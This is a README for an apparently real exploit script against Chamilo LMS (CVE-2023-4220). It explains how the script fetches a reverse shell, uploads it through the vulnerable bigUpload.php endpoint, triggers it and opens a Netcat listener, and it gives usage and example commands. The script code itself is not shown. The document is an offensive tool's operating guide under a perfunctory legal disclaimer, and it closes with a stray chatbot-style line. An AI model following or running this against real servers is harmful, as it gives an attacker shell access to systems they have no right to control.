# Chamilo LMS CVE-2023-4220 Exploit

## Overview

This script exploits a Remote Code Execution (RCE) vulnerability in **Chamilo LMS** versions **≤ v1.11.24**. The vulnerability (CVE-2023-4220) exists due to unrestricted file upload functionality in the **bigUpload.php** feature of Chamilo LMS, which allows attackers to upload arbitrary files (such as web shells) and execute them, leading to full remote code execution on the server.

This script has been enhanced by **Divine Clown** to streamline the exploitation process, automatically generating a reverse shell file, uploading it to the target, and launching a listener to give the attacker direct access to the shell.

---

## CVE Details

- **CVE ID**: [CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220)
- **Affected Software**: Chamilo LMS ≤ v1.11.24
- **Vulnerability Type**: Remote Code Execution (RCE)
- **Attack Vector**: Unrestricted file upload in `/main/inc/lib/javascript/bigupload/inc/bigUpload.php`

---

## Features

- Automatically downloads a reverse shell from **revshells.com** based on the attacker's IP and port.
- Uploads the reverse shell using the vulnerable `bigUpload.php` endpoint.
- Silently triggers the shell and opens a Netcat listener for direct access.

### Enhancement by Divine Clown:
- All intermediate steps (downloading shell, uploading, etc.) are hidden, showing only the resulting reverse shell for streamlined use.

---

## Usage

```bash
./CVE-2023-4220.sh -i <attacker_ip> -p <port> -h <host_link>
```

### Parameters:
- `-i <attacker_ip>`: The attacker's IP address for the reverse shell.
- `-p <port>`: The port where the Netcat listener will be started.
- `-h <host_link>`: The full URL of the vulnerable Chamilo LMS instance.

### Example:

```bash
./CVE-2023-4220.sh -i 10.10.14.15 -p 9001 -h http://target-site.com
```

---

## Prerequisites

- **Netcat** installed on your machine.
- Ensure the target Chamilo LMS version is vulnerable (≤ v1.11.24).
- Proper permissions to perform penetration testing or exploitation.

---

## Technical Breakdown

1. The script downloads a reverse shell from **revshells.com**, dynamically generating it based on the attacker's IP and port.
2. The reverse shell is uploaded to the vulnerable **bigUpload.php** endpoint.
3. The uploaded file is executed by accessing its URL on the server.
4. A Netcat listener is started, and once the file is triggered, a reverse shell connection is established, giving the attacker command-line access.

---

## Legal Disclaimer

This tool is intended solely for educational purposes and testing environments where you have explicit permission to exploit vulnerabilities. **Unauthorized access to systems is illegal** and may result in criminal charges. The authors will not be held responsible for any misuse or damage caused by this script.

---

## Credits

- **Original Exploit Author**: Ziad Sakr [@Ziad-Sakr](https://twitter.com/ZiadSakr)
- **Enhancements and Refinements**: ME(Divine Clown)

---

Feel free to modify the README further if you want to include any additional information or formatting! Let me know if you need anything else.